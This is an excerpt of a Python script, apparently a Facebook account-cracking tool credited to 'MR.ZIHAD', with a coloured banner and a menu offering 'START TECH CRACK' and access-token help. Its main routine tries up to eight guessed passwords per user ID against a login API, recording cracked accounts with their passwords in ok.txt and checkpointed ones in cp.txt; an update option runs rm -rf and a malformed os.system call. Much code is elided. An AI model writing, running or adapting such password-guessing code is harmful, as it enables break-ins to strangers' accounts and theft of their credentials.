...
\033[1;92m\
d88888D d888888b db   db  .d8b.  d8888b. 
YP  d8'   `88'   88   88 d8' `8b 88  `8D 
   d8'     88    88ooo88 88ooo88 88   88 
  d8'      88    88~~~88 88~~~88 88   88 
 d8' db   .88.   88   88 88   88 88  .8D 
d88888P Y888888P YP   YP YP   YP Y8888D' 
                                                             
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: Bangladesh Privet Cyber security Agency
\033[1;92mDEVLOPED BY \033[1;93m: MR.ZIHAD
...
def main():
	...
	print("")
	print("\033[92;1m  [01] START TECH CRACK")
	print("\033[93;1m  [02] HOW TO GET ACCESS TOKEN")
	print("\033[94;1m  [03] UPDATE TECH TOOL")
	print("\033[96;1m  [04] TECHNICAL ZIHAD")
...
def log_sel():
	...
	if sel == "":
		...
		subprocess.check_output(["am", "start", "https://youtube.com/channel/UCHjWhH9orDaDLqPAUBrl6uQ"])
		main()
	elif sel =="3" or sel =="03":
		import os
		try:
			os.system("https://github.com/MR-ZIHAD/TECH")
			os.system("rm -rf TECH.py")
			os.system("cp -f TECH/TECH.py \\.")
			os.system("rm -rf TECH")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				print(" \033[1;32m[TECH-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[1;33m[TECH-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					data = requests.get(api, params=params, headers=headers_)
					if "access_token" in data.text and "EAAA" in data.text:
						print(" \033[1;32m[TECH-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[1;33m[TECH-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							data = requests.get(api, params=params, headers=headers_)
							if "access_token" in data.text and "EAAA" in data.text:
								print(" \033[1;32m[TECH-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[1;33m[TECH-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									data = requests.get(api, params=params, headers=headers_)
									if "access_token" in data.text and "EAAA" in data.text:
										print(" \033[1;32m[TECH-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;33m[TECH-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											data = requests.get(api, params=params, headers=headers_)
											if "access_token" in data.text and "EAAA" in data.text:
												print(" \033[1;32m[TECH-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in data.json()['error_msg']:
													print(" \033[1;33m[TECH-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													data = requests.get(api, params=params, headers=headers_)
													if "access_token" in data.text and "EAAA" in data.text:
														print(" \033[1;32m[TECH-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;33m[TECH-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															data = requests.get(api, params=params, headers=headers_)
															if "access_token" in data.text and "EAAA" in data.text:
																print(" \033[1;32m[TECH-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;33m[TECH-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	data = requests.get(api, params=params, headers=headers_)
																	if "access_token" in data.text and "EAAA" in data.text:
																		print(" \033[1;32m[TECH-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;33m[TECH-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
